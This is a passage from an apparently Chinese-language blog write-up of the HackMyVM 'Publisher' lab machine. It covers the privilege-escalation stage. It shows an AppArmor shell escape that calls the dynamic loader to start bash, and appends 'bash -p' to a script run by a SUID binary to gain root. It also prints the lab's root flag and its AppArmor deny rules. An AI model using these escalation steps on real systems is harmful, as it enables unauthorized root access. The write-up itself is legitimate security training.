/opt/run_container.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试修改，无法修改\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ echo \u003cspan class=\"hljs-string\"\u003e\"bash -p\"\u003c/span\u003e \u003e\u003e /opt/run_container.sh\n-ash: /opt/run_container.sh: Permission denied\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没懂怎么利用，看了作者的\u003ccode\u003eWP\u003c/code\u003e （你们的\u003ccode\u003eesay\u003c/code\u003e好难）\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e首先我们可以看到\u003cem\u003e\u003cstrong\u003eAppArmor\u003c/strong\u003e\u003c/em\u003e已\u003cem\u003e\u003cstrong\u003e启用\u003c/strong\u003e\u003c/em\u003e：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们注意到我们的shell不是\u003cstrong\u003ebash\u003c/strong\u003e而是\u003cstrong\u003eash：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPublisher/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们还看到我们当前的 shell有一个\u003cstrong\u003eAppArmor配置文件：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://miro.medium.com/v2/resize:fit:777/0*pGAUT27loR_WNe7d\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e才看到现在的\u003ccode\u003eshell\u003c/code\u003e不是\u003ccode\u003ebash\u003c/code\u003e，而是\u003ccode\u003eash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ env\nSHELL=/usr/sbin/ash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我已经使用内核库来生成不受限制的 bash shell：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行此命令时，它会使用指定的\u003cstrong\u003e动态链接器/加载器\u003c/strong\u003e( \u003cstrong\u003eld-linux-x86–64.so.2\u003c/strong\u003e ) 来加载所需的共享库并启动**/bin/bash** shell。这种使用二进制文件直接调用链接器/加载器的方法是一种通过明确指定要用于该特定二进制文件的动态链接器/加载器来执行二进制文件的方法\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们拥有对\u003ccode\u003e/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2\u003c/code\u003e拥有完全的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ ls -al /usr/lib/x86_64-linux-gnu/ld-linux-x86-\u003cspan class=\"hljs-number\"\u003e64.\u003c/span\u003eso\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e \nlrwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e Nov \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/lib/x86_64-linux-gnu/ld-linux-x86-\u003cspan class=\"hljs-number\"\u003e64.\u003c/span\u003eso\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e -\u003e ld-\u003cspan class=\"hljs-number\"\u003e2.31\u003c/span\u003e.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e然后我在脚本中添加了“ \u003cstrong\u003ebash -p”并运行了SUID\u003c/strong\u003e二进制文件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ echo \u003cspan class=\"hljs-string\"\u003e\"bash -p\"\u003c/span\u003e \u003e\u003e /opt/run_container.sh \nthink@publisher:/usr/lib64$ /usr/sbin/run_container \n\u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e of Docker containers:\nID: 41c976e507f8 | Name: jovial_hertz | Status: Up \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hours\n\nEnter the ID of the container \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e leave blank to create a new one: \n/opt/run_container.sh: line \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e: validate_container_id: command \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e found \n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) Start Container\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) Stop Container\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) Restart Container\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) Create Container\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e) Quit\nChoose an action \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a container: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nError response \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e daemon: page \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e found\nError: failed to start containers: \nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eROOT\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) euid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) egid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root),\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think)\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRootFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cat root.txt\u003c/span\u003e\n3a4225cc9e85709adda6ef55d6a4f2ca \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e为什么OPT不可以访问呢？\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/547772872\"\u003ehttps://zhuanlan.zhihu.com/p/547772872\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e首先我们的\u003ccode\u003eshell\u003c/code\u003e是\u003ccode\u003eASH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e其次是\u003ccode\u003eapparmor\u003c/code\u003e 限制了，\u003ccode\u003eapparmor\u003c/code\u003e 可以对程序进行访问控制，靶机里就是限制呢我们的\u003ccode\u003eshell\u003c/code\u003e \u003ccode\u003eASH\u003c/code\u003e ，下面是对ASH限制的配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cd /etc/apparmor.d/\u003c/span\u003e\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\nabi           disable         local        nvidia_modprobe  tunables     usr.sbin.ash       usr.sbin.mysqld    usr.sbin.tcpdump\nabstractions  force-complain  lsb_release  sbin.dhclient    usr.\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e.man  usr.sbin.ippusbxd  usr.sbin.rsyslogd\nbash-\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-comment\"\u003e# cat usr.sbin.ash \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;tunables/global\u003e\u003c/span\u003e\n\n/usr/sbin/ash flags=(complain) {\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/base\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/bash\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/consoles\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/nameservice\u003e\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;abstractions/user-tmp\u003e\u003c/span\u003e\n\n  \u003cspan class=\"hljs-comment\"\u003e# Remove specific file path rules\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e# Deny access to certain directories\u003c/span\u003e\n  deny /opt/ r,\n  deny /opt/** rwx,\n  /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/** mrix,\n  /usr/sbin/** mrix,\n\n  \u003cspan class=\"hljs-comment\"\u003e# Simplified rule for accessing /home directory\u003c/span\u003e\n  owner /home/** rwix,\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到是 \u003ccode\u003edeny /opt/ r\u003c/code\u003e  \u003ccode\u003edeny /opt/** rwx\u003c/code\u003e，限制了我们对\u003ccode\u003eOPT\u003c/code\u003e文件夹里边的文件的所有权限\u003c/p\u003e\n\u003cp\u003e因此我们通过动态链接库回到 \u003ccode\u003ebash\u003c/code\u003e 环境后，改配置文件就对我们不起效了\u003c/p\u003e","title":"HackMyVM - Publisher","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMPublisher"},"buildId":"uS_pXrRdGjyth3yLj87AK","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>